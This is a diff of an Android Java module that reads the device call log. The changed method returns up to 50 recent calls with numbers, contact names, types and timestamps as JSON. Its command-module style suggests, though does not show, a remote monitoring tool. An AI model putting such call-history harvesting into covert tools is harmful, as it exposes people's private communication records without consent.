@@ -24,35 +24,77 @@ public class CallsModule {
         try {
             JSONArray callsList = new JSONArray();
             ContentResolver cr = context.getContentResolver();
-            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI,
-                null, null, null, CallLog.Calls.DATE + " DESC LIMIT 50");
             
-            if (cursor != null && cursor.moveToFirst()) {
+            // Fix: Use proper selection and sort order, LIMIT needs to be handled differently
+            Cursor cursor = cr.query(
+                CallLog.Calls.CONTENT_URI,
+                null,  // projection - all columns
+                null,  // selection - no filter
+                null,  // selection args
+                CallLog.Calls.DATE + " DESC" // sort order - no LIMIT here
+            );
+            
+            if (cursor != null) {
+                int count = 0;
+                int maxResults = 50; // Limit to 50 results
+                
                 int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                 int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
                 int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
                 int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);
+                int nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
                 
-                do {
+                // Check if indices are valid
+                if (numberIdx == -1 || typeIdx == -1 || dateIdx == -1 || durationIdx == -1) {
+                    cursor.close();
+                    return "ERROR: Could not access call log columns";
+                }
+                
+                while (cursor.moveToNext() && count < maxResults) {
                     JSONObject call = new JSONObject();
-                    call.put("number", cursor.getString(numberIdx));
-                    call.put("date", cursor.getLong(dateIdx));
-                    call.put("duration", cursor.getString(durationIdx));
+                    
+                    // Safely get values with null checks
+                    String number = cursor.getString(numberIdx);
+                    call.put("number", number != null ? number : "Unknown");
+                    
+                    // Get contact name if available
+                    if (nameIdx != -1) {
+                        String name = cursor.getString(nameIdx);
+                        call.put("name", name != null ? name : "");
+                    }
+                    
+                    long date = cursor.getLong(dateIdx);
+                    call.put("date", date);
+                    
+                    String duration = cursor.getString(durationIdx);
+                    call.put("duration", duration != null ? duration : "0");
                     
                     int type = cursor.getInt(typeIdx);
                     String typeStr = "UNKNOWN";
                     if (type == CallLog.Calls.INCOMING_TYPE) typeStr = "INCOMING";
                     else if (type == CallLog.Calls.OUTGOING_TYPE) typeStr = "OUTGOING";
                     else if (type == CallLog.Calls.MISSED_TYPE) typeStr = "MISSED";
+                    else if (type == CallLog.Calls.VOICEMAIL_TYPE) typeStr = "VOICEMAIL";
+                    else if (type == CallLog.Calls.REJECTED_TYPE) typeStr = "REJECTED";
+                    else if (type == CallLog.Calls.BLOCKED_TYPE) typeStr = "BLOCKED";
+                    
                     call.put("type", typeStr);
                     
+                    // Add formatted date for easy display
+                    java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
+                    String formattedDate = sdf.format(new java.util.Date(date));
+                    call.put("formatted_date", formattedDate);
+                    
                     callsList.put(call);
-                } while (cursor.moveToNext());
+                    count++;
+                }
                 
                 cursor.close();
             }
             
+            // Return as JSON array string - no prefix needed
             return callsList.toString();
+            
         } catch (Exception e) {
             e.printStackTrace();
             return "ERROR: " + e.getMessage();
